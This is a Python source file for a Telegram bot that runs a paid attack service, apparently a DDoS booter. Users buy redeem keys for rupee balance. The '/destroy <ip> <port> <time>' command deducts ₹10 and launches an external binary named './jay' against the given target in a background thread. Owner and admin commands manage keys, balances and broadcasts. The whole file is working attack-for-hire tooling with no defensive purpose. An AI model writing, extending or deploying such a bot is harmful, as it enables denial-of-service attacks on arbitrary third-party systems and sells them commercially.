import json
import subprocess
import threading
import time
import random
import string
from telegram import ParseMode
from telegram.ext import Updater, CommandHandler, CallbackContext
from telegram import Update

# ====== CONFIGURATION ======
TOKEN = "YOUR_TELEGRAM_BOT_TOKEN"
OWNER_ID = 123456789  # Replace with your Telegram user ID
DATA_FILE = "data.json"
ATTACK_COST = 10      # ₹ per attack

# ====== DATA STORAGE ======
def load_data():
    try:
        with open(DATA_FILE, "r") as f:
            return json.load(f)
    except FileNotFoundError:
        return {"users": {}, "keys": {}}

def save_data(data):
    with open(DATA_FILE, "w") as f:
        json.dump(data, f, indent=2)


# ====== UTILITIES ======
def ensure_user(data, user_id):
    uid = str(user_id)
    if uid not in data["users"]:
        data["users"][uid] = {"balance": 0, "is_admin": False}
    return data["users"][uid]

def is_admin(data, user_id):
    uid = str(user_id)
    return data["users"].get(uid, {}).get("is_admin", False) or user_id == OWNER_ID

def run_attack(bot, chat_id, ip, port, duration):
    # Execute binary and capture output
    proc = subprocess.Popen(
        ["./jay", ip, port, duration],
        stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True
    )
    output, _ = proc.communicate()
    # Try to parse "Data used: X" from stdout
    data_used = "Unknown"
    for line in output.splitlines():
        if "Data used" in line:
            data_used = line.split(":",1)[1].strip()
            break

    bot.send_message(
        chat_id=chat_id,
        text=f"<b>✅ Attack finished ✅</b>\nData consumed: {data_used} bytes",
        parse_mode=ParseMode.HTML
    )

# ====== COMMAND HANDLERS ======
def start(update: Update, ctx: CallbackContext):
    text = (
        "🚀🚀 *WELCOME TO THE ATTACK BOT* 🚀🚀\n\n"
        "Use /help to see all commands."
    )
    update.message.reply_text(text, parse_mode=ParseMode.MARKDOWN)

def help_cmd(update: Update, ctx: CallbackContext):
    text = (
        "*Available Commands:*\n"
        "/destroy <ip> <port> <time> – launch attack (cost ₹10)\n"
        "/balance – show your balance\n"
        "/redeem <key> – redeem a generated key\n"
        "/ping – check bot latency\n\n"
        "*Admin Only:*\n"
        "/genkey <amount> – create a redeem key\n"
        "/broadcast <msg> – send to all users\n\n"
        "*Owner Only:*\n"
        "/addadmin <user_id> <balance> – grant admin + balance\n"
        "/deladmin <user_id> – revoke admin\n"
    )
    update.message.reply_text(text, parse_mode=ParseMode.MARKDOWN)

def destroy(update: Update, ctx: CallbackContext):
    user = update.effective_user
    chat_id = update.effective_chat.id
    args = ctx.args
    data = load_data()
    usr = ensure_user(data, user.id)

    if usr["balance"] < ATTACK_COST:
        update.message.reply_text("❌ Insufficient balance. Recharge with a redeem key.")
        return
    if len(args) != 3:
        update.message.reply_text("Usage: /destroy <ip> <port> <time>")
        return

    ip, port, duration = args
    # Deduct cost
    usr["balance"] -= ATTACK_COST
    save_data(data)

    # Notify start
    ctx.bot.send_message(
        chat_id=chat_id,
        text="<b>⚠️ Attack started ⚠️</b>",
        parse_mode=ParseMode.HTML
    )

    # Run attack in background
    threading.Thread(
        target=run_attack,
        args=(ctx.bot, chat_id, ip, port, duration),
        daemon=True
    ).start()

def genkey(update: Update, ctx: CallbackContext):
    user = update.effective_user
    data = load_data()
    if not is_admin(data, user.id):
        update.message.reply_text("❌ You are not authorized.")
        return
    if len(ctx.args) != 1 or not ctx.args[0].isdigit():
        update.message.reply_text("Usage: /genkey <amount>")
        return

    amount = int(ctx.args[0])
    # generate random key
    key = "".join(random.choices(string.ascii_uppercase+string.digits, k=12))
    data["keys"][key] = amount
    save_data(data)
    update.message.reply_text(f"🔑 Generated key: `{key}` (₹{amount})", parse_mode=ParseMode.MARKDOWN)

def redeem(update: Update, ctx: CallbackContext):
    user = update.effective_user
    chat_id = update.effective_chat.id
    data = load_data()
    if len(ctx.args) != 1:
        update.message.reply_text("Usage: /redeem <key>")
        return

    key = ctx.args[0]
    if key not in data["keys"]:
        update.message.reply_text("❌ Invalid or already used key.")
        return

    amount = data["keys"].pop(key)
    usr = ensure_user(data, user.id)
    usr["balance"] += amount
    save_data(data)
    update.message.reply_text(f"✅ Redeemed ₹{amount}. New balance: ₹{usr['balance']}.")

def balance(update: Update, ctx: CallbackContext):
    user = update.effective_user
    data = load_data()
    usr = ensure_user(data, user.id)
    update.message.reply_text(f"💰 Your balance: ₹{usr['balance']}.")

def ping(update: Update, ctx: CallbackContext):
    chat_id = update.effective_chat.id
    t0 = time.time()
    msg = ctx.bot.send_message(chat_id, "Pinging…")
    latency = int((time.time() - t0) * 1000)
    ctx.bot.edit_message_text(f"Pong! {latency} ms", chat_id, msg.message_id)

def addadmin(update: Update, ctx: CallbackContext):
    user = update.effective_user
    data = load_data()
    if user.id != OWNER_ID:
        update.message.reply_text("❌ Owner only.")
        return
    if len(ctx.args) != 2 or not ctx.args[0].isdigit() or not ctx.args[1].isdigit():
        update.message.reply_text("Usage: /addadmin <user_id> <initial_balance>")
        return

    uid, bal = ctx.args
    usr = ensure_user(data, int(uid))
    usr["is_admin"] = True
    usr["balance"] = int(bal)
    save_data(data)
    update.message.reply_text(f"✅ User {uid} is now admin with ₹{bal} balance.")

def deladmin(update: Update, ctx: CallbackContext):
    user = update.effective_user
    data = load_data()
    if user.id != OWNER_ID:
        update.message.reply_text("❌ Owner only.")
        return
    if len(ctx.args) != 1 or not ctx.args[0].isdigit():
        update.message.reply_text("Usage: /deladmin <user_id>")
        return

    uid = ctx.args[0]
    if uid in data["users"]:
        data["users"][uid]["is_admin"] = False
        save_data(data)
        update.message.reply_text(f"✅ Admin rights revoked for {uid}.")
    else:
        update.message.reply_text("❌ User not found.")

def broadcast(update: Update, ctx: CallbackContext):
    user = update.effective_user
    data = load_data()
    if not is_admin(data, user.id):
        update.message.reply_text("❌ Admin only.")
        return
    msg = " ".join(ctx.args)
    if not msg:
        update.message.reply_text("Usage: /broadcast <message>")
        return

    sent, failed = 0, 0
    for uid in data["users"].keys():
        try:
            ctx.bot.send_message(int(uid), msg)
            sent += 1
        except:
            failed += 1

    update.message.reply_text(f"Broadcast sent to {sent} users; {failed} failures.")

# ====== SETTING UP BOT ======
def main():
    updater = Updater(TOKEN, use_context=True)
    dp = updater.dispatcher

    # register handlers
    dp.add_handler(CommandHandler("start", start))
    dp.add_handler(CommandHandler("help", help_cmd))
    dp.add_handler(CommandHandler("destroy", destroy))
    dp.add_handler(CommandHandler("genkey", genkey))
    dp.add_handler(CommandHandler("redeem", redeem))
    dp.add_handler(CommandHandler("balance", balance))
    dp.add_handler(CommandHandler("ping", ping))
    dp.add_handler(CommandHandler("addadmin", addadmin))
    dp.add_handler(CommandHandler("deladmin", deladmin))
    dp.add_handler(CommandHandler("broadcast", broadcast))

    updater.start_polling()
    updater.idle()

if __name__ == "__main__":
    main()